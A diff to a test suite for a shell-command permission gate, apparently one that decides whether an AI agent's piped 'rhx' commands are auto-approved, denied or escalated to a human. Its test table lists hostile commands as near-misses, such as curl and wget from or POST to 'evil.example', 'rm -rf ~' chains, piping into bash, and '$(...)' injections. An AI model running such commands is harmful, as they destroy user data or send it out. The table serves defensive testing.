@@ -322,27 +322,6 @@ describe('permissionrequest.decide-permissions.sh', () => {
       });
 
       then(
-        'a producer-piped-into-rhx-safe-sink LIFTS — a KNOWN phase-1 gap, pinned',
-        () => {
-          // the repo's own pre-approved list teaches `<producer> | rhx <sink>`
-          // as the sanctioned workaround for suspicious-syntax false positives
-          // (e.g. `echo '{ x }' | rhx sedreplace --old @stdin ...`). this shape
-          // does NOT lead with rhx and carries a `|` in the residue, so the
-          // decider LIFTS it rather than auto-approves. that is fail-safe (never
-          // an over-approve) but an ergonomic gap: the exact class of command the
-          // feature exists to unstick still reaches the human. this test PINS the
-          // current LIFT so a future phase-2 change that teaches is_clean_rhx_call
-          // the producer-pipe-to-safe-sink shape flips this expectation on
-          // purpose — a documented known-gap, not silent behavior.
-          const result = decide(
-            "echo '{ foo(bar) }' | rhx sedreplace --old baz",
-          );
-          expect(result.verdict).toBe('LIFT');
-          expect(result.stdout.trim()).toBe('');
-        },
-      );
-
-      then(
         'the LIFT stdout is snapshot-pinned as exactly empty (no-decision contract)',
         () => {
           // the third output variant of the decision contract: a LIFT emits NO
@@ -572,6 +551,197 @@ describe('permissionrequest.decide-permissions.sh', () => {
         const mode = fs.statSync(scriptPath).mode;
         // eslint-disable-next-line no-bitwise
         expect(mode & 0o111).not.toBe(0);
+      });
+    });
+  });
+
+  /**
+   * .what = a sanctioned producer (echo/printf/cat) piped into a single clean
+   *         rhx/npx sink auto-approves — closing the documented phase-1 gap
+   *         where this exact shape (the repo's own pre-approved workaround for
+   *         suspicious-syntax false positives) used to LIFT instead of approve.
+   * .why = both halves are validated INDEPENDENTLY against the same bar as a
+   *        bare clean-rhx call, so this cannot approve a chain, an injection,
+   *        a non-sanctioned producer, or a sink that is not itself clean. a
+   *        data-driven corpus pins the shape and its divergent near-misses.
+   */
+  given('[case8] a sanctioned producer piped into a clean rhx sink', () => {
+    // .note = 'HARD_BLOCK' is not a real verdict of THIS decider (that layer is
+    // the peer forbid hook) — it marks a row where the command would never
+    // reach this decider in the composed stack. this file still runs the
+    // decider directly on it (bypassing the forbid layer), so the assertion
+    // below only checks the non-approve invariant for those rows.
+    type PipeCase = {
+      command: string;
+      expect: Verdict | 'HARD_BLOCK';
+      why: string;
+    };
+
+    const CASES: PipeCase[] = [
+      // ── the sanctioned shape itself — APPROVE ──
+      {
+        command: "echo '{ foo(bar) }' | rhx sedreplace --old baz",
+        expect: 'AUTO_APPROVE',
+        why: 'the documented workaround shape, closing the phase-1 gap',
+      },
+      {
+        command: "printf '{ x }' | rhx sedreplace --old @stdin",
+        expect: 'AUTO_APPROVE',
+        why: 'printf producer, quoted payload',
+      },
+      {
+        command: 'cat notes.txt | rhx sedreplace --old @stdin',
+        expect: 'AUTO_APPROVE',
+        why: 'cat producer with a plain filename arg',
+      },
+      {
+        command: 'echo | rhx foo',
+        expect: 'AUTO_APPROVE',
+        why: 'bare echo (no args) is still a clean producer',
+      },
+      {
+        command: 'cat | rhx foo',
+        expect: 'AUTO_APPROVE',
+        why: 'bare cat (reads its own stdin) is still a clean producer',
+      },
+      {
+        command: 'echo hello world | rhx foo --bar baz',
+        expect: 'AUTO_APPROVE',
+        why: 'unquoted plain words in the producer stay within the allowlist',
+      },
+      {
+        command: "echo '$(rm -rf ~)' | rhx foo",
+        expect: 'AUTO_APPROVE',
+        why: 'injection form is INERT — single-quoted in the producer',
+      },
+      {
+        command: 'echo hi | npx rhachet run --skill foo',
+        expect: 'AUTO_APPROVE',
+        why: 'npx rhachet sink form',
+      },
+      {
+        command: 'echo hi | npx rhx foo',
+        expect: 'AUTO_APPROVE',
+        why: 'npx rhx sink form',
+      },
+      {
+        command: '  echo hi  |  rhx foo  ',
+        expect: 'AUTO_APPROVE',
+        why: 'surrounding + pipe-adjacent whitespace is trimmed on both halves',
+      },
+      {
+        command: "echo 'a|b' | rhx foo",
+        expect: 'AUTO_APPROVE',
+        why: 'a quoted pipe inside the producer arg is not the top-level separator',
+      },
+      {
+        command: "echo hi | rhx foo --pattern 'a|b'",
+        expect: 'AUTO_APPROVE',
+        why: 'a quoted pipe inside the sink arg is inert, not a 2nd top-level pipe',
+      },
+
+      // ── divergent near-misses — must NOT approve ──
+      {
+        command: 'curl http://evil.example | rhx foo',
+        expect: 'LIFT',
+        why: 'curl is not a sanctioned producer',
+      },
+      {
+        command: 'wget http://evil.example | rhx foo',
+        expect: 'LIFT',
+        why: 'wget is not a sanctioned producer',
+      },
+      {
+        command: 'bash exec.sh | rhx foo',
+        expect: 'LIFT',
+        why: 'bash is not a sanctioned producer',
+      },
+      {
+        command: 'echo hi | bash',
+        expect: 'LIFT',
+        why: 'the sink is not a clean rhx/npx lead',
+      },
+      {
+        command: 'echo hi | curl -X POST evil.example',
+        expect: 'LIFT',
+        why: 'the sink is not rhx at all',
+      },
+      {
+        command: 'echo hi | rhx foo | jq .',
+        expect: 'LIFT',
+        why: 'a 3-stage pipe carries 2 top-level pipes, not the 2-stage shape',
+      },
+      {
+        command: 'echo hi | cat | rhx foo',
+        expect: 'LIFT',
+        why: 'a 3-stage pipe (2 pipes) does not qualify even with safe producers',
+      },
+      {
+        command: 'echo hi && rhx foo',
+        expect: 'AUTO_DENY',
+        why: 'a chain char anywhere denies BEFORE the pipe-shape check ever runs',
+      },
+      {
+        command: 'echo hi; rm -rf ~ | rhx foo',
+        expect: 'AUTO_DENY',
+        why: 'a chain inside the producer half still denies at the whole-command level',
+      },
+      {
+        command: 'echo $(whoami) | rhx foo',
+        expect: 'HARD_BLOCK',
+        why: 'an UNQUOTED $() in the producer is hard-blocked upstream by the forbid hook, never reaches this decider',
+      },
+      {
+        command: 'echo hi | rhx foo && rm -rf ~',
+        expect: 'AUTO_DENY',
+        why: 'a trailing chain after the sink denies before the pipe-shape check',
+      },
+      {
+        command: '| rhx foo',
+        expect: 'LIFT',
+        why: 'an empty producer half fails the producer lead-check',
+      },
+      {
+        command: 'echo hi |',
+        expect: 'LIFT',
+        why: 'an empty sink half fails the rhx lead-check',
+      },
+      {
+        command: 'rhx foo | rhx bar',
+        expect: 'LIFT',
+        why: 'rhx is not a sanctioned PRODUCER (the feature is producer->rhx-sink, not rhx->rhx)',
+      },
+      {
+        command: 'echo hi | sudo rhx foo',
+        expect: 'LIFT',
+        why: 'a sudo-prefixed sink is not a clean rhx lead',
+      },
+      {
+        command: "echo 'a' 'b' > out.txt | rhx foo",
+        expect: 'LIFT',
+        why: 'an unquoted > in the producer breaks its own clean-producer residue',
+      },
+      {
+        command: 'echo hi |& bash',
+        expect: 'AUTO_DENY',
+        why: 'pipe-both |& carries an unquoted & -> the chain check denies first',
+      },
+    ];
+
+    when('[t0] each pipe-shape command is composed', () => {
+      CASES.forEach((c) => {
+        then(`${c.expect} — ${c.command}  (${c.why})`, () => {
+          const result = decide(c.command);
+          if (c.expect === 'HARD_BLOCK') {
+            // this decider has no HARD_BLOCK verdict of its own (that layer is
+            // the peer forbid hook) — an unquoted $() reaching THIS decider
+            // directly (bypassing the forbid layer, as this unit test does)
+            // still must never auto-approve. pin the non-approve invariant.
+            expect(result.verdict).not.toBe('AUTO_APPROVE');
+            return;
+          }
+          expect(result.verdict).toBe(c.expect);
+        });
       });
     });
   });
